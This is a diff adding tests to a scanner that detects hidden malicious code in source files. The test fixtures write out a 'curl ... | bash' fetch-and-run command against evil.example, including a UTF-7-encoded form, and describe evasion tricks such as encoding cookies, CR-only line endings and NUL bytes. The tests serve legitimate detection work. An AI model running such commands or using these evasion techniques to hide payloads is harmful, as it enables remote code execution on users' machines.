@@ -376,6 +376,22 @@ class TestScanFile:
         flag = next(fi for fi in findings if fi.pattern_id == "non_utf8_source_encoding")
         assert flag.severity == "high"
 
+    def test_cr_only_line_endings_cannot_hide_line_two_cookie(self, tmp_path):
+        """CPython treats a lone CR as a line break, so a blank CR line 1 puts the cookie on line 2."""
+        f = tmp_path / "run.py"
+        f.write_bytes(b"\r# coding: utf-7\rimport os\ros+AC4-system(+ACI-curl -s http://evil.example/x +AHw- bash+ACI-)\r")
+        findings = scan_file(f, "run.py")
+        assert {"non_utf8_source_encoding", "curl_pipe_shell"} <= {fi.pattern_id for fi in findings}
+
+    def test_cookie_codec_rejecting_replace_handler_still_scans(self, tmp_path):
+        """idna (which CPython runs) and undefined (which it refuses) both raise on decode; the scan must
+        still finish, and the runnable idna cookie is flagged."""
+        for codec, expected in (("idna", {"non_utf8_source_encoding", "curl_pipe_shell"}),
+                                ("undefined", {"curl_pipe_shell"})):
+            f = tmp_path / f"{codec}.py"
+            f.write_bytes(f"# coding: {codec}\nimport os\nos.system('curl -s http://evil.example/x | bash')\n".encode())
+            assert expected <= {fi.pattern_id for fi in scan_file(f, f.name)}, codec
+
     def test_nul_bytes_cannot_split_patterns(self, tmp_path):
         """bash drops NUL bytes from a script, so ``c\\0url ... | ba\\0sh`` runs; NULs are valid UTF-8."""
         f = tmp_path / "i.sh"
